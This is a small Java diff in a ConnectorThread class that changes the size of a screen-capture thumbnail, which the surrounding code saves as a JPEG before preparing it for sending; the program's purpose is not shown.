@@ -87,7 +87,7 @@ public class ConnectorThread extends Thread implements Runnable {
                        }
  
                        BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
-                       Image img = image.getScaledInstance(150, 100, BufferedImage.SCALE_SMOOTH);
+                       Image img = image.getScaledInstance(250, 150, BufferedImage.SCALE_SMOOTH);
  
                        ImageIO.write(toBufferedImage(img), "jpg", new File(USER+".jpg"));
                        File fileToSend = new File(USER+".jpg");
